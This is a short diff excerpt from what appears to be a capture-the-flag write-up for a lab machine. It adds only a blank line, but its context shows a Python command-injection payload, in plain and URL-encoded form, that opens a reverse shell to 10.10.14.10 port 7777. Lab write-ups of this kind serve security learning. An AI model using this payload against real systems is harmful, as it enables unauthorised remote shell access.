@@ -137,6 +137,7 @@ Payload='; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.
 This payload works as
 * First finish the command that assigns the output variable with **';**
 * Next, it provides another command that we want to execute(Here,reverse shell)
+
 URL Encode the payload and then putting it in url gives a reverse shell.
 ```url
 http://10.10.10.168:8080/%27%3B%20s%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%2710%2E10%2E14%2E10%27%2C7777%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%27%2Fbin%2Fsh%27%2C%27%2Di%27%5D%29%3B%20%23  
